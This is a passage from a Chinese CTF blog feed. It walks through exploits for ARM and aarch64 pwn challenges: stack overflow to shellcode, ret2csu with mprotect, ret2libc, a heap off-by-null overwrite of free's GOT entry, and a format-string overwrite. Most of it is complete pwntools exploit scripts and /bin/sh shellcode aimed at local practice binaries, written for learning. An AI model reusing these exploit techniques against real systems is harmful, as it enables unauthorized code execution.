])io.sendlineafter(<span class="string">b&#x27;Welcome to bi0s CTF!\n&#x27;</span>, payload)shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span><span class="string">    add r0, pc, #12</span><span class="string">    mov r1, #0</span><span class="string">    mov r2, #0</span><span class="string">    mov r7, #11</span><span class="string">    svc 0</span><span class="string">    .ascii "/bin/sh\\0"</span><span class="string">&#x27;&#x27;&#x27;</span>)payload = shellcode.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(bss)<span class="comment"># pause()</span>io.send(payload)io.interactive()</code></pre><p>不过<a href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">ZIKH26</a>师傅的payload有些理不清</p><h1 id="题目三：64位-aarch64架构-动态"><a href="#题目三：64位-aarch64架构-动态" class="headerlink" title="题目三：64位 aarch64架构 动态"></a>题目三：64位 aarch64架构 动态<a id="third"></a></h1><p>上海骇极杯 2018 baby_arm</p><blockquote><p>sky123师傅写了，可以修改pwndbg&#x2F;lib&#x2F;regs.py中的寄存器的定义名，这样pwndbg就能显示出$31$30等寄存器名称</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121840669.png" alt="image-20240712184024595"></p><p>往bss段上写数据，然后存在栈溢出</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png" alt="image-20240712184140558"></p><p>aarch64指令集中：x0~x7传参  x29 栈顶指针  x30 LR</p><pre class=" language-highlight assembly"><code class="language-highlight assembly"> X0   0x0 X1   0x40007fff00 ◂— 0x6161616261616161 (&#x27;aaaabaaa&#x27;) X2   0x200 X3   0x40009b1500 ◂— 0 X4   0x0 X5   0x9f075092a1c1abdb X6   0x40009adb10 ◂— 0 X7   0x40000000000 X8   0x3f X9   0xffff X10  0x0 X11  0x0 X12  0x4000841e48 ◂— udf #0 X13  0x0 X14  0x0 X15  0x6fffff47 X16  0x411028 —▸ 0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]! X17  0x4000901b40 ◂— stp x29, x30, [sp, #-0x30]! X18  0x73516240 X19  0x400868 ◂— stp x29, x30, [sp, #-0x40]! X20  0x0 X21  0x400610 ◂— mov x29, #0 X22  0x0 X23  0x0 X24  0x0 X25  0x0 X26  0x0 X27  0x0 X28  0x0 X29  0x6161617261616171 (&#x27;qaaaraaa&#x27;) X30  0x6161617461616173 (&#x27;saaataaa&#x27;) SP   0x40007fff50 ◂— 0x6161617661616175 (&#x27;uaaavaaa&#x27;)*PC   0x61617461616173</code></pre><p>在main函数返回时，x30-&gt;‘saaataaa’ offset&#x3D;72</p><pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])shellcode = asm(shellcraft.sh())io.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)sleep(<span class="number">0.3</span>)payload = cyclic(<span class="number">72</span>) + p64(<span class="number">0x411068</span>)  <span class="comment">#PC -> bss_addr <- shellcode</span>io.sendline(payload)io.interactive()</code></pre><p>ret2csu</p><p>mprotect(bss, 0x1000, 7)  -&gt; x0 &#x3D; bss_addr   x1&#x3D;0x1000  x2&#x3D;7  x3&#x3D;mprotect_plt</p><p>csu -&gt; x24 &#x3D; bss_addr x23 &#x3D; 0x1000 x22 &#x3D; 7 x21&#x3D;mprotect_plt x19&#x3D;0  x20&#x3D;1</p><pre class=" language-highlight assembly"><code class="language-highlight assembly">.text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j -->csu2.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3].text:00000000004008B0                 MOV             X2, X22.text:00000000004008B4                 MOV             X1, X23.text:00000000004008B8                 MOV             W0, W24.text:00000000004008BC                 ADD             X19, X19, #1.text:00000000004008C0                 BLR             X3.text:00000000004008C4                 CMP             X19, X20.text:00000000004008C8                 B.NE            loc_4008AC.text:00000000004008CC.text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   -->csu1.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10].text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20].text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30].text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40.text:00000000004008DC                 RET</code></pre><p>布置csu1：先布置x29和x30，x30存储函数调用的返回地址，在执行ret后调用，控制x30指向csu2，实现第一次控制流挟持；然后控制对应寄存器在csu2中的赋值</p><p>控制csu2：按照对应寄存器进行赋值，然后x19+1，会与x20比较，如果相等就会继续执行csu1，此时通过布置栈空间可以再次控制x30，执行到ret时能够实现第二次控制流挟持。</p><pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)<span class="comment"># io = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;9999&#x27;, &#x27;./shanghai_baby_arm&#x27;])</span>io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])elf = ELF(<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>)bss = <span class="number">0x411068</span>shellcode = asm(shellcraft.aarch64.sh()).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])   <span class="comment">#0x411068</span>io.sendafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)sleep(<span class="number">0.3</span>)<span class="comment"># .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j -->csu2</span><span class="comment"># .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><span class="comment"># .text:00000000004008B0                 MOV             X2, X22</span><span class="comment"># .text:00000000004008B4                 MOV             X1, X23</span><span class="comment"># .text:00000000004008B8                 MOV             W0, W24</span><span class="comment"># .text:00000000004008BC                 ADD             X19, X19, #1</span><span class="comment"># .text:00000000004008C0                 BLR             X3</span><span class="comment"># .text:00000000004008C4                 CMP             X19, X20</span><span class="comment"># .text:00000000004008C8                 B.NE            loc_4008AC</span><span class="comment"># .text:00000000004008CC</span><span class="comment"># .text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   -->csu1</span><span class="comment"># .text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><span class="comment"># .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><span class="comment"># .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><span class="comment"># .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><span class="comment"># .text:00000000004008DC                 RET</span>csu1 = <span class="number">0x00000000004008CC</span>csu2 = <span class="number">0x00000000004008AC</span><span class="comment">#mprotect(bss_addr, 0x1000, 7)   --> x19=0, x20=1, x21=mprotect_addr, x22=7, x23=0x1000, x24=bss_addr, x29=0xdeadbeef, x30=csu2</span>payload  = cyclic(<span class="number">72</span>) + p64(csu1)payload += p64(<span class="number">0xdeadbeef</span>) + p64(csu2)  <span class="comment">#x29  x30</span>payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#x19 x20</span>payload += p64(bss+<span class="number">0x100</span>) + p64(<span class="number">7</span>) <span class="comment">#x21  x22</span>payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0x411000</span>) <span class="comment">#x23  x24 </span>payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x29  x30->shellcode</span>payload += p64(<span class="number">0</span>)*<span class="number">6</span> <span class="comment"># pause()</span>io.sendline(payload)io.interactive()</code></pre><p>当然也可以用第二题的思路，利用read(0, &amp;buf, 0x200)实现任意地址写，然后往bss段里写数据，不过没意义罢了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122029207.png" alt="image-20240712202911121"></p><h1 id="题目四：32位-arm-ret2libc"><a href="#题目四：32位-arm-ret2libc" class="headerlink" title="题目四：32位 arm ret2libc"></a>题目四：32位 arm ret2libc<a id="fourth"></a></h1><p>Codegate2018 melong</p><p>给定了libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122034634.png" alt="image-20240712203449585"></p><p>在write_diary函数中，nbytes大小可控，可能存在溢出，a2是main函数中的局部变量</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122044100.png" alt="image-20240712204410053"></p><p>nbytes&#x3D;*v8，v8是PT函数的返回值，我们需要尽可能控制v8为大数造成溢出</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122045717.png" alt="image-20240712204505676"></p><p>PT函数，发现存在返回值size可控，我们的利用目标就是它了，但是我们需要控制ptr&#x3D;&#x3D;exc2，exc2位于bss段中，初始化为0</p><p>当malloc失败时返回值为0</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122047946.png" alt="image-20240712204759900"></p><p>在这些之前，需要进入check给v6赋值才能接下来操作</p><p>所以我们先进入case1设置v6&#x3D;!0，然后进入case3输入size&#x3D;-1从而malloc失败，使ptr&#x3D;exc2&#x3D;0，size_t的size被赋值为了0xffffffff，之后进入case4的write_diary，通过  LDRB    R3, [R11,#nbytes] 从R11的-5偏移处加载一字节到R3寄存器中</p><pre class=" language-highlight assembly"><code class="language-highlight assembly">.text:000106D4 write_diary                             ; CODE XREF: main+184↓p.text:000106D4.text:000106D4 buf             = -0x14.text:000106D4 var_10          = -0x10.text:000106D4 nbytes          = -5.text:000106D4.text:000106D4                 PUSH    &#123;R11,LR&#125;.text:000106D8                 ADD     R11, SP, #4.text:000106DC                 SUB     SP, SP, #0x10.text:000106E0                 STR     R0, [R11,#var_10].text:000106E4                 STR     R1, [R11,#buf].text:000106E8                 LDR     R3, [R11,#var_10].text:000106EC                 LDR     R3, [R3].text:000106F0                 STRB    R3, [R11,#nbytes].text:000106F4                 LDRB    R3, [R11,#nbytes].text:000106F8                 CMP     R3, #0.text:000106FC                 BEQ     loc_10720.text:00010700                 LDRB    R3, [R11,#nbytes].text:00010704                 MOV     R2, R3          ; nbytes.text:00010708                 LDR     R1, [R11,#buf]  ; buf.text:0001070C                 MOV     R0, #0          ; fd.text:00010710                 BL      read.text:00010714                 LDR     R1, [R11,#buf].text:00010718                 LDR     R0, =format     ; "you wrote %s\n".text:0001071C                 BL      printf</code></pre><p>最终实现read(0, v5, 0xff)，v5为主函数的局部变量，离栈底只有0x54字节长</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131320268.png" alt="image-20240713132058100"></p><p>可以直接用栈地址作为返回地址，将shellcode布置在栈上，打ret2shellcode。</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/env python</span><span class="comment"># coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">chk</span>():    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    context.arch = <span class="string">&#x27;arm&#x27;</span>    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>    pwnfile = <span class="string">&#x27;./melong&#x27;</span>    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    libc = ELF(libc_name)    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./  ./melong&#x27;)</span>    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;</span>)    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *0x01117C&#x27;, pwnfile)</span>    dbg(<span class="string">&#x27;b *0x01126C \n b *0x0010710&#x27;</span>)    chk()    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))    shellcode  = <span class="string">b"\x02\x20\x42\xe0\x1c\x30\x8f\xe2"</span>    shellcode += <span class="string">b"\x04\x30\x8d\xe5\x08\x20\x8d\xe5"</span>    shellcode += <span class="string">b"\x13\x02\xa0\xe1\x07\x20\xc3\xe5"</span>    shellcode += <span class="string">b"\x04\x30\x8f\xe2\x04\x10\x8d\xe2"</span>    shellcode += <span class="string">b"\x01\x20\xc3\xe5\x0b\x0b\x90\xef"</span>    shellcode += <span class="string">b"/bin/sh"</span>    payload = shellcode.ljust(<span class="number">84</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(<span class="number">0xfffef0d0</span>)    sl(payload)    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))    itr()</code></pre><p>ret2libc 构造puts泄露信息，需要利用PC控制puts调用后的下一条指令</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/env python</span><span class="comment"># coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">chk</span>():    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    context.arch = <span class="string">&#x27;arm&#x27;</span>    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>    pwnfile = <span class="string">&#x27;./melong&#x27;</span>    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    libc = ELF(libc_name)    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./  ./melong&#x27;</span>)    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;)</span>    <span class="comment"># dbg(&#x27;b *0x01126C \n b *0x0010710&#x27;)</span>    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]    main = elf.sym[<span class="string">&#x27;main&#x27;</span>]<span class="comment"># .text:000110BC                 BL      puts</span><span class="comment"># .text:000110C0                 NOP</span><span class="comment"># .text:000110C4                 POP     &#123;R11,PC&#125;</span><span class="comment"># .text:000110C4 ; End of function check_first</span>    puts= <span class="number">0x000110BC</span>    pr0 = <span class="number">0x00011bbc</span>    pr3 = <span class="number">0x00010460</span>    pr4 = <span class="number">0x000105e4</span>    pr11= <span class="number">0x00011290</span>     chk()    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(puts_got) + p32(puts) + p32(<span class="number">0</span>) + p32(main)    sl(payload)    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))    puts_addr = uu32(r32())    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]    bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))       chk()    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(bin_sh) + p32(system)    sl(payload)    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))    leak(<span class="string">"libc_base"</span>, libc_base)    itr()</code></pre><h1 id="题目五：aarch64架构-off-by-null"><a href="#题目五：aarch64架构-off-by-null" class="headerlink" title="题目五：aarch64架构 off by null"></a>题目五：aarch64架构 off by null<a id="obn"></a></h1><p>DASCTF 1月赛 ememarm</p><p>2.27  aarch64 的堆题 </p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131516580.png" alt="image-20240713151602487"></p><p>去了符号表 </p><p>edit函数中存在off by null漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131528523.png" alt="image-20240713152844453"></p><h2 id="本地交叉编译"><a href="#本地交叉编译" class="headerlink" title="本地交叉编译"></a><strong>本地交叉编译</strong><a id="loc"></a></h2><p>异架构对于堆来说有些不太友好，题目只给了一个libc文件，如果是x86系列，能直接从网上下载deb文件加压到libc同级的.debug文件夹下，设置debug-file-directory为.debug文件夹，调试时就能自动加载符号。但是arm架构不能如此，参考<a href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">winmt</a>本地自行编译：</p><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">tar -xvf ./glibc-2.27.tar.xzmkdir aarch64mkdir buildcd buildCC=/usr/bin/aarch64-linux-gnu-gcc \CXX=/usr/bin/aarch64-linux-gnu-g++ \CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \../configure \--prefix=/ctf/work/archs/arm64/2.27/glibc-2.27/aarch64 \--host=aarch64-linux \--target=aarch64-linux \--disable-werrormakemake install</code></pre><p>然后在题目目录下：ln -s &#x2F;ctf&#x2F;work&#x2F;archs&#x2F;arm64&#x2F;2.27&#x2F;glibc-2.27&#x2F;aarch64&#x2F;lib .&#x2F;</p><p>调试时能加载符号信息</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142046659.png" alt="image-20240714204402367"></p><p>可惜pwngdb里面的命令会报错 或是不正确反映，以后看看能不能搞搞这个（搁着先）</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png" alt="image-20240714210328489"></p><p>创造一个fake chunk，然后任意写改free_got为system，退出执行free(‘&#x2F;bin&#x2F;sh’)</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># coding = utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):    sla(<span class="string">b&#x27;you choice: \n&#x27;</span>, <span class="built_in">str</span>(num))<span class="keyword">def</span> <span class="title function_">add0</span>(<span class="params">cx=<span class="string">b&#x27;a&#x27;</span>, cy=<span class="string">b&#x27;b&#x27;</span>, ori=<span class="number">0</span></span>):    menu(<span class="number">1</span>)    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):    menu(<span class="number">2</span>)    sl(<span class="built_in">str</span>(idx))<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx, content=<span class="string">b&#x27;&#x27;</span></span>):    menu(<span class="number">3</span>)    sl(<span class="built_in">str</span>(idx))    s(content)<span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">cx=<span class="string">b&#x27;c&#x27;</span>, cy=<span class="string">b&#x27;d&#x27;</span>, ori=<span class="number">0</span></span>):    menu(<span class="number">4</span>)    sla(<span class="string">b&#x27;cx:\n&#x27;</span>, cx)    sla(<span class="string">b&#x27;cy:\n&#x27;</span>, cy)    sla(<span class="string">b&#x27;do you want delete?\n&#x27;</span>, <span class="built_in">str</span>(ori))<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    context.arch = <span class="string">&#x27;aarch64&#x27;</span>    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>    pwnfile = <span class="string">&#x27;./ememarm&#x27;</span>    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    libc = ELF(libc_name)    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-aarch64 -L ./ -g 12345 ./ememarm&#x27;)</span>    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ ./ememarm&#x27;</span>)    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *_start&#x27;, pwnfile)</span>    <span class="comment"># dbg("b *0x00400D40 ")</span>    sla(<span class="string">b&#x27;hello every one welcom my note  ~~4268144\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)    add0(<span class="string">b&#x27;aaaa&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>, <span class="number">0</span>)    add0(<span class="string">b&#x27;cccc&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>, <span class="number">0</span>)    add0(<span class="string">b&#x27;eeee&#x27;</span>, <span class="string">b&#x27;ffff&#x27;</span>, <span class="number">1</span>)    add1(<span class="string">b&#x27;gggg&#x27;</span>, p64(<span class="number">0x31</span>), <span class="number">1</span>)    dele(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;deadbeef&#x27;</span>)    add1(<span class="string">b&#x27;hhhh&#x27;</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]), <span class="number">0</span>)    dele(<span class="number">2</span>, p64(<span class="number">0x4000831000</span> + libc.sym[<span class="string">&#x27;system&#x27;</span>]))    menu(<span class="number">5</span>)    itr()</code></pre><h1 id="题目六：aarch64架构-格式化字符串"><a href="#题目六：aarch64架构-格式化字符串" class="headerlink" title="题目六：aarch64架构 格式化字符串"></a>题目六：aarch64架构 格式化字符串<a id="fmt"></a></h1><p>WKCTF2024  something_changed  </p><p>漏洞还是很简单，存在栈溢出和格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141932654.png" alt="image-20240714193242494"></p><p>主要说一些比赛时候的思路：</p><blockquote><p>通过不断测试远程printf来泄露栈地址 –&gt; 发现泄露出来的地址固定不变  –&gt; 猜测是用qemu起的环境  –&gt; ret2shellcode备着   不过每次连接canary的值会变</p><p>qemu起的程序相当于保护全关 而且这道题本身就没开FULL RELRO和pie。还给了backdoor  –&gt; 优先 一次性改好 再是改printf二次利用</p></blockquote><p>直接用一次性格式化字符串来改__stack_chk_fail_got为backdoor就行了</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141946475.png" alt="27275487-64e1-4985-9147-f9d421f1d03d"></p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment"># coding = utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import *</span><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :    <span class="comment"># context.log_level = &#x27;info&#x27;</span>    context.arch = <span class="string">&#x27;aarch64&#x27;</span>    IPort = <span class="string">&#x27;1 1&#x27;</span>    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span>    pwnfile = <span class="string">&#x27;./silent&#x27;</span>    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>    elf  = ELF(pwnfile)    libc = ELF(libc_name)    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)    <span class="comment"># dbg("b *0x04007F4 \n b *0x000400854")</span>    <span class="comment"># dbg("b *0x000400854")</span>    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span>    backdoor = <span class="number">0x00400770</span>    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)    sl(payload)    itr()<span class="comment">#canary   %19$p</span></code></pre><p>杂七杂八</p><p>printf前</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947979.png" alt="image-20240714194505752"></p><p>printf后</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947663.png" alt="image-20240714194737601"></p><p>可以发现从 x1开始打印，到x7，然后开始打印栈上的数据</p><p>printf的源码有空再看咯，先贴一位师傅的博客<a href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%8D%95%E6%AC%A1-printf-%E5%88%A9%E7%94%A8">格式化字符串漏洞利用 - WJH’s Blog (wjhwjhn.com)</a>，原理就在这里。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一些师傅的博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/ZIKH26/articles/16077191.html&quot;&gt;关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="arm" scheme="http://example.com/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯夏季赛pwn</title>
    <link href="http://example.com/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/"/>
    <id>http://example.com/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/</id>
    <published>2024-07-07T04:44:56.000Z</published>
    <updated>2024-07-15T03:42:50.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024春秋杯夏季赛-pwn"><a href="#2024春秋杯夏季赛-pwn" class="headerlink" title="2024春秋杯夏季赛-pwn"></a>2024春秋杯夏季赛-pwn</h1><p>awdp没看，ctf只做出来两题，还有一题理论可行。</p><blockquote><p>参考博客：</p><p><a href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p><p><a href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024春秋杯WP - lmarch2 - 博客园 (cnblogs.com)</a></p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#stdout">stdout</a></p><ul><li><a href="#first">解法一</a></li><li><a href="#second">解法二</a></li><li><a href="#third">解法三</a></li></ul><p>- <a href="#Shuffled_Execution">Shuffled_Execution</a></p><p>- <a href="#Save_the_preceniss">Save the preceniss</a></p><ul><li><a href="#fail">不可能的爆破…</a></li><li><a href="#success">正确解法</a></li></ul><h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout<a id="stdout"></a></h2><p>libc版本：Ubuntu GLIBC 2.31-0ubuntu9.9</p><p>主函数溢出0x10字节，能覆盖到ret_addr；程序中有vuln函数，溢出 0x200-0x20 字节</p><p>初始化函数中   setvbuf(stdout, 0LL, 0, 0LL)设置为了标准输出无缓冲，setvbuf(stdin, 0LL, 2, 0LL)还是正常输出</p><pre class=" language-highlight c"><span class="type">int</span> <span class="title function_">init</span><span class="params"><code class="language-highlight c"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span>&#123;  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);  <span class="keyword">return</span> setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);&#125;</code></pre><p>看了其他师傅的，整理出来三种解法：</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一<a id="first"></a></h3><p>每次十六分之一的概率，爆破stdout–&gt;_IO_2_1_stderr_，然后就能正常打印，再打ret2libc</p><pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#coding:utf-8</span><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *<span class="comment">#from ctypes import 